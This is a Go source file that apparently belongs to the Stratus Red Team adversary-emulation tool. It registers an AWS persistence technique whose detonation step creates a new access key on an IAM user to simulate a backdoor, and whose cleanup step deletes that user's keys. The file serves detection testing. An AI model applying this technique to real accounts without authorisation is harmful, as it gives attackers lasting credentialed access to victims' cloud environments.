package aws

import (
	"context"
	_ "embed"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/internal/registrations"
	"github.com/datadog/stratus-red-team/pkg/attacktechnique"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	registrations.RegisterAttackTechnique(attacktechnique.AttackTechnique{
		Name:                       "aws.persistence.backdoor-iam-user",
		Platform:                   "aws",
		PrerequisitesTerraformCode: tf,
		Detonate: func(terraformOutputs map[string]string) error {
			iamClient := iam.NewFromConfig(providers.GetAWSProvider())
			log.Println("Creating access key on legit IAM user to simulate backdoor")
			result, err := iamClient.CreateAccessKey(context.Background(), &iam.CreateAccessKeyInput{UserName: aws.String("sample-legit-user")})
			if err != nil {
				return err
			}
			log.Println("Successfully created access key " + *result.AccessKey.AccessKeyId)
			return nil
		},
		Cleanup: func() error {
			iamClient := iam.NewFromConfig(providers.GetAWSProvider())
			log.Println("Removing access key from IAM user")
			result, err := iamClient.ListAccessKeys(context.TODO(), &iam.ListAccessKeysInput{UserName: aws.String("sample-legit-user")})
			if err != nil {
				return err
			}
			for i := range result.AccessKeyMetadata {
				iamClient.DeleteAccessKey(context.Background(), &iam.DeleteAccessKeyInput{AccessKeyId: result.AccessKeyMetadata[i].AccessKeyId})
			}

			return nil
		},
	})
}
